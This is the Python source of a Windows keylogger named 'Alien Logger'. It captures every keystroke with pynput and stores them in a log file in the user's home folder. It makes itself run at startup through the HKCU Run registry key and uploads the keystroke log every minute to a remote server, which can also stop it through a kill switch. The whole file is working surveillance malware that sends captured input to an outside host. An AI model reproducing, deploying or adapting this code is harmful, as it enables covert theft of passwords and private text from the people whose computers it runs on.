# ▄▄▄· ▄▄▌  ▪  ▄▄▄ . ▐ ▄     ▄▄▌         ▄▄ •  ▄▄ • ▄▄▄ .▄▄▄
#▐█ ▀█ ██•  ██ ▀▄.▀·•█▌▐█    ██•  ▪     ▐█ ▀ ▪▐█ ▀ ▪▀▄.▀·▀▄ █·
#▄█▀▀█ ██▪  ▐█·▐▀▀▪▄▐█▐▐▌    ██▪   ▄█▀▄ ▄█ ▀█▄▄█ ▀█▄▐▀▀▪▄▐▀▀▄
#▐█ ▪▐▌▐█▌▐▌▐█▌▐█▄▄▌██▐█▌    ▐█▌▐▌▐█▌.▐▌▐█▄▪▐█▐█▄▪▐█▐█▄▄▌▐█•█▌
# ▀  ▀ .▀▀▀ ▀▀▀ ▀▀▀ ▀▀ █▪    .▀▀▀  ▀█▄▀▪·▀▀▀▀ ·▀▀▀▀  ▀▀▀ .▀  ▀
# https://xn--rihy934p.ws

import os
import sys
import wx
import winreg
import time
import schedule
import requests
from requests.exceptions import ConnectionError
import pynput
from pynput.keyboard import Key, Listener

app = wx.App()
word_counts = 0
keys = []
url = "xn--rihy934p.ws"

def add_startup():
    if(getattr(sys, "frozen", False)):
        filepath = os.path.realpath(sys.executable)
        key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
        key_to_add = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_value, 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(key_to_add, "AlienLogger", 0, winreg.REG_SZ, filepath)
        winreg.CloseKey(key_to_add)

def prompt_key():
    frame = wx.Frame(None, -1, "win.py")
    frame.SetSize(0, 0, 200, 50)
    dlg = wx.TextEntryDialog(frame, "Enter your secret key from 👽⌨️.ws to begin", "Alien Logger")
    if(dlg.ShowModal() == wx.ID_OK):
        if(dlg.GetValue() == ""):
            return "empty"
        else:
            return dlg.GetValue()
    dlg.Destroy()
    sys.exit()

def check_connection():
    try:
        request = requests.get("https://" + url)
    except ConnectionError:
        return False
    else:
        return True

def check_kill():
    if(check_connection()):
        r = requests.get("https://" + url + "/kill")
        if(r.text == "True"):
            sys.exit()
    else:
        wx.MessageBox("Could not connect to remote server\nCheck your internet connection and try again", "Error", wx.OK | wx.ICON_WARNING)
        sys.exit()

def check_api_key(key):
    if(check_connection()):
        r = requests.post("https://" + url + "/keycheck?key=" + api_key)
        if(r.status_code != 200):
            return False
        else:
            return True
    else:
        wx.MessageBox("Could not connect to remote server\nCheck your internet connection and try again", "Error", wx.OK | wx.ICON_WARNING)
        sys.exit()

def check_file(file):
    try:
        with open(file) as f:
            return True
    except IOError:
        return False

check_kill()

config_path = os.path.expanduser("~") + "\config.txt"
log_path = os.path.expanduser("~") + "\logs.txt"

if(check_file(config_path)):
    f = open(config_path, "r")
    api_key = f.read()
    if(api_key == ""):
        api_key = "empty"
    f.close()
else:
    api_key = prompt_key()

if(check_api_key(api_key)):
    f = open(config_path, "w")
    f.write(api_key)
    f.close()
    add_startup()
else:
    wx.MessageBox("Your secret key could not be verified\nDelete " + config_path + " and try again", "Error", wx.OK | wx.ICON_WARNING)
    sys.exit()

def upload():
    if(check_connection()):
        with open(log_path, "rb") as f:
            data = {"text": f}
            r = requests.post("https://" + url + "/api?key=" + api_key, data=data)

schedule.every(1).minutes.do(upload)

def get_date():
    return time.strftime("%d/%m/%Y %H:%M:%S %z | ")

def on_press(key):
    global word_counts, keys
    keys.append(key)
    word_counts += 1
    if(word_counts >= 5):
        word_counts = 0
        keys.append("\n")
        keys.insert(0, get_date())
        write_file(keys)
        keys = []

def write_file(key_arr):
    with open(log_path, "a") as f:
        for key in key_arr:
            ke = str(key).replace("'", "")
            if(ke.find("Key.") != -1):
                f.write(ke.replace("Key.", "<") + ">")
            if(ke.find("Key") == -1):
                f.write(ke)

listener = Listener(on_press=on_press)
listener.start()

while True:
    schedule.run_pending()
    time.sleep(1)
